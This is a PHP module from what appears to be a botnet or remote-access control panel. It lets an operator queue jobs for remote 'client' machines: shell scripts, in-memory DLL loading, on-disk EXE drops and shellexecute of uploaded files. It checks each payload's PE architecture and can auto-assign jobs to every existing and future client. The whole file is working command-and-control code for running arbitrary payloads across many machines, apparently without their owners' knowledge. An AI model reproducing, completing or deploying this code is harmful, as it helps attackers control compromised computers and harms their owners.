<?php
/*
	mod_ajax_mjobs.php

*/

	require_once 'mod_ajax_misc.php';
	require_once 'mod_db.php';
	require_once 'mod_petools.php';

// values for ENUM_COMMAND_EXEC_RESULT
define('CER_NO_RESULT', 0);
define('CER_ERR_NO_EXECUTOR', 1);
define('CER_ERR_PLATFORM_MISMATCH', 2);
define('CER_ERR_SPECIFIC_ERROR', 3);
define('CER_OK', 4);

/*
  	Translates binary status codes & errors into it's textual representation
  	Returns a string
  	$cmd_code = [1..4] (shell_script, dll_mem, exe_disk, file_disk)
*/
function _qJobStatusIdToText($exec_result, $extra_bin, $cmd_code)
{

	switch ($exec_result) {

	case CER_NO_RESULT: return 'no result';
	case CER_ERR_NO_EXECUTOR: return 'ERR: no module to execute this command';
	case CER_ERR_PLATFORM_MISMATCH: return 'ERR: platform mismatch';
	case CER_OK: return 'OK';

	case CER_ERR_SPECIFIC_ERROR:

		// decode extra params for this error
		// CMDEXEC_SPECIFIC_ERROR
		$params = unpack('VdwSpecificErrCode/VdwLastError', $extra_bin);

		if ((count($params) != 2) || (strlen($extra_bin)<8)) { return 'ERR: specific error, decode failure (p_c='.count($params).', l='.strlen($extra_bin).')';  }

		// decode answer
		$se = array(
          	array('Unknown cmd_code'), 	// 0
          	array('unk', 'ERR_CREATEPIPES_FAIL', 'ERR_EMPTY_SHELLSCRIPT', 'ERR_STDIN_WRITE_FAILED', 'ERR_STDIN_WRITE_FAILED_2', 'ERR_PEEKPIPE_FAILED', 1000 => 'ERR_EXEC_HUNGED', 1001 => 'ERR_EXEC_FAILURE' ), // 1
          	array('unk', 'ERR_ALREADY_RUNNING', 'ERR_EMPTY_FILE', 'ERR_PE_LOAD_FAILED', 'ERR_DLLENTRY_RETURNED_FALSE', 'ERR_DLLENTRY_EXCEPTION', 1000 => 'ERR_EXEC_HUNGED', 1001 => 'ERR_EXEC_FAILURE'),      	 // 2
			array('unk', 'ERR_DE_EMPTY_FILE', 'ERR_DE_NO_EXTENSION_FOUND', 'ERR_DE_TMPFILE_NAME_GENERATE_FAIL', 'ERR_DE_CREATEFILE_FAILED', 'ERR_DE_WRITEFILE_FAILED', 'ERR_DE_FILE_REMOVED_AFTER_CREATION', 'ERR_DE_GETSIZE_FAILED', 'ERR_DE_SIZE_MISMATCH', 'ERR_DE_FILE_READ_FAILED', 'ERR_DE_FILE_MODIFIED_AFTER_WRITE',  1000 => 'ERR_EXEC_HUNGED', 1001 => 'ERR_EXEC_FAILURE')
		);
		$se[4] = $se[3];

		if (isset($se[$cmd_code][$params['dwSpecificErrCode']])) { return $se[$cmd_code][$params['dwSpecificErrCode']]." le={$params['dwLastError']}"; }
		else { return "unk error (cmd_code=".strval(intval($cmd_code))." spec_err={$params['dwSpecificErrCode']})"; }

	} // switch

}

// called from mJobs() when detected addjob cmd. Needs to validate fields and add record
// in case of error, should return json with 'error' field set (using errExit() function).
// No answer needed in case of success, client side updates commands list periodically itself
function mjobs_addjob()
{
	global $g_dblink;


	$memo = trim($_POST['memo']);
	if ($memo=='') { errExit('empty memo passed'); }

	$ctype = intval($_POST['ct']);
	if (($ctype<1)||($ctype>5)) { errExit('command type ({$ctype}) is out of defined range [1..5]'); }

	$ameth = intval($_POST['at']);
	if (($ameth<0)||($ameth>1)) { errExit('assignment method ({$ameth}) is out of defined range [1..2]'); }

	// used only for $ameth==1 to indicate need to add this command to all existing clients
	$assign_existing = intval($_POST['ae']);

	// by default, may assign to all archs
	$f_arch = 'all';

	// check extra params according to cmd type
	switch ($ctype) {

		case 1: // shell script, needs textarea
				$params = trim($_POST['shs']);
				if ($params == '') { errExit('empty script contents'); }
				break;

		case 2:
		case 3:
		case 4: // file passed
				//print_r($_FILES); exit;
				if ($_FILES['upf']['error'] != 0) { errExit('no file uploaded'); }
				$params = file_get_contents($_FILES['upf']['tmp_name']);
				unlink($_FILES['upf']['tmp_name']);

				// special for shell execute - place file extension at start
				if ($ctype == 4) {
					$path_parts = pathinfo($_FILES['upf']['name']);
					$params = ".{$path_parts['extension']}|".$params;
					break;
				}

				// parse PE header
				$headers = array();
                if (!ParsePEHeaders($params, $headers)) { errExit('unspecified PE parse error'); }

				// check if received not exe for cmdtype 3
				if (($ctype==3)&&(($headers['IMAGE_FILE_HEADER']['Characteristics'] & IMAGE_FILE_DLL)==IMAGE_FILE_DLL))
				{ errExit("Not an exe for cmdtype on-disk exe run (Characteristics=".strval($headers['IMAGE_FILE_HEADER']['Characteristics']).")"); }

				// check for not dll for cmdtype 2
				if (($ctype==2)&&(($headers['IMAGE_FILE_HEADER']['Characteristics'] & IMAGE_FILE_DLL)!=IMAGE_FILE_DLL))
				{ errExit("Not an dll for cmdtype dll run (Characteristics=".strval($headers['IMAGE_FILE_HEADER']['Characteristics']).")"); }

                // translate header's value into db enum field
                switch ($headers['IMAGE_FILE_HEADER']['Machine']) {
                	case IMAGE_FILE_MACHINE_I386: 	$f_arch = 'x32'; break;
                	case IMAGE_FILE_MACHINE_AMD64: 	$f_arch = 'x64'; break;
                	default: errExit('unsupported arch type (pos.2)'); break;
                } // switch

                // modify target arch for cmdtype 3 - on-disk exe run, allow x32 to run on any arch
                if (($ctype == 3)&&($f_arch != 'x64')) { $f_arch = 'all'; }

				break;

		case 5:	// no params here
				break;

		default: errExit("extra params parser not defined for cmd type {$ctype}"); break;
	}	// switch $ctype

	// calc hash of params attachment
	$params_hash = sha1($params);

	// prepare string params
	$memo = mysqli_real_escape_string($g_dblink, $memo);
	$params = mysqli_real_escape_string($g_dblink, $params);

	if (!(mysqli_query($g_dblink, "INSERT INTO `cmd_params` (`stamp`, `cmd_code`, `auto`, `targ_arch`, `params`, `params_hash`, `memo`) VALUES
								  (NOW(),
								  {$ctype},
								  {$ameth},
								  '{$f_arch}',
								  '{$params}',
								  '{$params_hash}',
								  '{$memo}' );"))) { errExit('add query failed: '.mysqli_error($g_dblink)); }

	// in case of auto command and specific option set, issue command add to cmds_list for all clients
	// NB: assignment for all new clients is handled by db trigger
	if (($ameth==1)&&($assign_existing==1)) {
		$insert_id = mysqli_insert_id($g_dblink);
		if ($insert_id) {

			// actually, a transaction should be used here

			// initial insert
			if (!mysqli_query($g_dblink, "INSERT INTO `cmds_list` (`target_id`) SELECT `id` FROM `cli`;")) { errExit('ae query 1 failed: '.mysqli_error($g_dblink)); }
			// update with values
			if (!mysqli_query($g_dblink, "UPDATE `cmds_list` SET `last_stamp`=`last_stamp`, `added_stamp`=NOW(), `linked_cmd_params`={$insert_id} WHERE `linked_cmd_params`=0;")) { errExit('ae query 2 failed: '.mysqli_error($g_dblink)); }

		} // $insert_id defined

	} // auto assignment

	echo json_encode(array('res'=>'ok'));
	exit;
}


function mjobs_deljob($rec_id)
{	$rid = intval($rec_id);
	if (!$rid) { errExit("invalid record id [{$rec_id}]"); }

    // do remove query

}



// only jobs definitions, status and config is done at machines page
function mJobs($ts, $mod_id)
{
  	global $g_dblink;

 	// define resulting answer
	$answer = array();
	// current module id
	$answer['m'] = $mod_id;

  	// memo edit parser
  	if (isset($_POST['jeid'])) { mParseJeditMemo('cmd_params', TRUE, $_POST['jeid']); exit; }

	// cmd buttons parser
	if (isset($_POST['c'])) {

		switch ($_POST['c']) {

			case 'del-job': if (mDeleteRowRequest('cmd_params', $answer, $mod_id, $_POST['r'])) {				             	// delete job description ok, remove all job records linked
				             	mysqli_query($g_dblink, "DELETE FROM `cmds_list` WHERE `linked_cmd_params`=".strval(intval($_POST['r'])));
							}

							break;

			default: errExit("unknown cmd [{$_POST['c']}]");
		} // switch cmd

		echo json_encode($answer);
	    exit;

	} // cmd passed



	// check if command defined
	if (@isset($_POST['cmd'])) {

		switch ($_POST['cmd']) {

			case 'addjob' : mjobs_addjob(); break;

        	default: errExit("unknown cmd {$_POST['cmd']}"); break;
       	} // switch cmd passed

	    exit;
	} // cmd defined

	// prepare query
	$sql_extra = '';
	if ($ts) { $sql_extra = "WHERE `stamp` > FROM_UNIXTIME({$ts})";  }
	$sql = "SELECT 	`id`,
					DATE_FORMAT(`stamp`, '%d/%m %H:%i') AS `stamp`,
					(UNIX_TIMESTAMP(NOW()) - UNIX_TIMESTAMP(`stamp`)) AS `ts_ago`,
					UNIX_TIMESTAMP(`stamp`) AS `ts`,
					`memo`,
					`cmd_code`,
					`auto`,
					(IF((`cmd_code` IN (1,4)), `params`, `params_hash`)) AS `params`,
					LENGTH(`params`) AS `params_len`,
					`targ_arch`
					FROM `cmd_params` {$sql_extra} ORDER BY `auto` DESC, `id` ASC";

    // issue query
	if (!($res = mysqli_query($g_dblink, $sql))) { errExit("db query error: ".mysqli_error($g_dblink)); }

	$answer['r'] = array();
	$answer['ts'] = 0;

	while ($row = mysqli_fetch_assoc($res)) {

		// set some fields

		// convert to text for cmdid 4 - shellexecute
		if ($row['cmd_code'] == 4) {
			$p = explode("|", $row['params'], 2);
			$row['params'] = "Target extension <b>{$p[0]}</b>";
			unset($p);
		} // shellexecute

		// add <pre> for shell script
		if ($row['cmd_code'] == 1) { $row['params'] = "<pre>{$row['params']}</pre>"; }

		// make contents from (params, params_len, cmd_code)
		$row['contents'] = CmdIdToString($row['cmd_code'])." (".BytesFormatted($row['params_len']).")<br>{$row['params']}";

		// special wrapping for id 5
		if ($row['cmd_code'] == 5) { $row['contents'] = CmdIdToString($row['cmd_code']); }

		unset($row['cmd_code']); unset($row['params_len']); unset($row['params']);

		// convert auto value to text
		if ($row['auto'] > 0) { $row['auto'] = '<b>auto</b>'; } else { $row['auto'] = 'manual'; }

		$row['ts_ago'] = ticks2string($row['ts_ago']*100, TRUE);

		$answer['r'][] = $row;
       	if ($row['ts'] > $answer['ts'])  { $answer['ts'] = $row['ts']; }
	   	unset($row);
	} // while

	$answer['c'] = count($answer['r']);

	// all modules count assign
	$answer['mc'] = mCountsQuery();

	echo json_encode($answer);
	exit;
}


// called when panel query current list of all assignable jobs
// available
// returns json with 'r' array where i - id, v - textval of job to be shown
function qGetAssignableJobsList()
{
	global $g_dblink;
 	$res = array();
 	$res['r'] = array();

	if (!($r = mysqli_query($g_dblink, "SELECT `id`, `cmd_code`, `memo` FROM `cmd_params` WHERE `auto`=0 LIMIT 100;"))) { errExit("query error: ".mysqli_error($g_dblink)); }

	while ($row = mysqli_fetch_assoc($r)) {
       $row['v'] = $row['memo']." [".CmdIdToStringShort($row['cmd_code'])."]";
       unset($row['cmd_code']);  unset($row['memo']);

       $res['r'][] = $row;

	} // while $row

	echo json_encode($res);
	exit;
}





// called when web interface about to display a table with jobs info,
// assigned to a specific $cid
// NB: $cid is already intval()'ed
function qGetJobsForClientId($cid)
{	global $g_dblink;

 	$res = array();
 	$res['r'] = array();

	if (!($r = mysqli_query($g_dblink, "SELECT
										`cmds_list`.`id`,
										DATE_FORMAT(`cmds_list`.`last_stamp`, '%d/%m %H:%i') AS `ls`,
										DATE_FORMAT(`cmds_list`.`added_stamp`, '%d/%m %H:%i') AS `as`,
										(UNIX_TIMESTAMP(NOW()) - UNIX_TIMESTAMP(`cmds_list`.`last_stamp`)) AS `ls_ago`,
										(UNIX_TIMESTAMP(NOW()) - UNIX_TIMESTAMP(`cmds_list`.`added_stamp`)) AS `as_ago`,
										`cmds_list`.`is_done`,
										`cmds_list`.`answer`,
										`cmd_params`.`cmd_code`,
										`cmd_params`.`memo` FROM `cmds_list`
										LEFT JOIN `cmd_params` ON `cmds_list`.`linked_cmd_params`=`cmd_params`.`id`
										WHERE `cmds_list`.`target_id`={$cid}
										ORDER BY `cmds_list`.`is_done`, `cmds_list`.`last_stamp`, `cmds_list`.`id`
										LIMIT 1000;"))) { errExit("query error: ".mysqli_error($g_dblink)); }

	while ($row = mysqli_fetch_assoc($r)) {

       $row['v'] = $row['memo']." [".CmdIdToStringShort($row['cmd_code'])."]";

		// status field
       	if ($row['is_done']>0) {       		$row['status'] = _qJobStatusIdToText($row['is_done'], $row['answer'], $row['cmd_code']);
       	} else {       		if ($row['ls'] != '00/00 00:00') {
       			$row['status'] = 'sent for execution';
       		} else { $row['status'] = 'new'; }
       	}


		unset($row['cmd_code']);  unset($row['memo']);


       $row['as_ago'] = ticks2string($row['as_ago']*100, FALSE);


       $row['as'] .= "<br>".$row['as_ago']; unset($row['as_ago']);

	   if ($row['ls'] != '00/00 00:00') {
			$row['ls_ago'] = ticks2string($row['ls_ago']*100, TRUE);
			$row['ls'] .= "<br>".$row['ls_ago']; unset($row['ls_ago']);

	   } else { $row['ls']='-'; }

	   // return answer only for done_ok jobs
	   if ($row['is_done'] == CER_OK) { $row['answer'] = str_replace("\r\n", "\n", $row['answer']); } else { unset($row['answer']); }

       $res['r'][] = $row;

	} // while $row

	// mid info by id
	if (!($r = mysqli_query($g_dblink, "SELECT `mid` FROM `cli` WHERE `id`={$cid} LIMIT 1;"))) { errExit("query error: ".mysqli_error($g_dblink)); }
	$row = mysqli_fetch_assoc($r);
	$res['mid'] = $row['mid'];

	echo json_encode($res);
	exit;
}

// receives intval()'ed ids to add a new job record for a particular machine
// returns json array with elements to show popup with addjob result:
// c - title, t - text, p - type (success, error, warning etc)
function qAddJob($target_id, $job_id)
{ 	global $g_dblink;

 	$res = array();
 	$res['c'] = 'Error'; $res['t'] = ''; $res['p'] = 'error';

	do { // not a loop

 		if ((!$target_id)||(!$job_id)) { $res['t'] = 'Invalid id passed'; break; }

		// query basic info needed for safety check and notify display
		$cli = mysqli_fetch_assoc(mysqli_query($g_dblink, "SELECT mid, memo, m_name, d_name, arch FROM cli WHERE id={$target_id};"));
		$cmd = mysqli_fetch_assoc(mysqli_query($g_dblink, "SELECT cmd_code, targ_arch, memo FROM cmd_params WHERE id={$job_id};"));

 		// check arch types to be compatible
   		if ( ($cmd['targ_arch'] != 'all') && ($cli['arch'] != $cmd['targ_arch']) ) {     		$res['t'] = "Unable to add command for arch <b>{$cmd['targ_arch']}</b> when client has mismatched arch <b>{$cli['arch']}</b>"; break;
   		}

		// add cmd
		if (!($r = mysqli_query($g_dblink, "INSERT INTO `cmds_list` (`target_id`, `linked_cmd_params`, `added_stamp`) VALUES ({$target_id}, {$job_id}, NOW());"))) { $res['t'] = 'Query failed: '.mysqli_error($g_dblink); break; }

		// update special field so webpart's liveupdate will catch this change
		if (!($r = mysqli_query($g_dblink, "UPDATE `cli` SET `stamp`=`stamp`, `lastcmd_stamp`=NOW() WHERE `id`={$target_id} LIMIT 1;"))) { $res['t'] = 'Query failed: '.mysqli_error($g_dblink); break; }


		// all done ok if got here
  		$res['p'] = 'info'; $res['c'] = 'Command added';
  		$res['t'] = "Added <b>{$cmd['memo']}[".CmdIdToStringShort($cmd['cmd_code'])."]</b> to {$cli['mid']}<br>{$cli['memo']}";

	} while (FALSE);	// not a loop

	echo json_encode($res);
	exit;
}

// simply removes a single job by id
// NB: $jid should be already intval()'ed
function qRemoveJob($jid)
{ 	global $g_dblink;

 	$res = array();

 	do { // not a loop


 		// update last cmd flag
		if (!($r = mysqli_query($g_dblink, "UPDATE `cli` SET `stamp`=`stamp`, `lastcmd_stamp`=NOW() WHERE `id`=(SELECT `target_id` FROM `cmds_list` WHERE `id`={$jid} LIMIT 1) LIMIT 1;"))) { $res['error'] = 'Query failed: '.mysqli_error($g_dblink); break; }

        // remove row via generic function
		mDeleteRowRequest('cmds_list', $res, '', $jid);
		$res['r'] = "j{$jid}";


	} while (FALSE); // not a loop

	echo json_encode($res);
	exit;
}


?>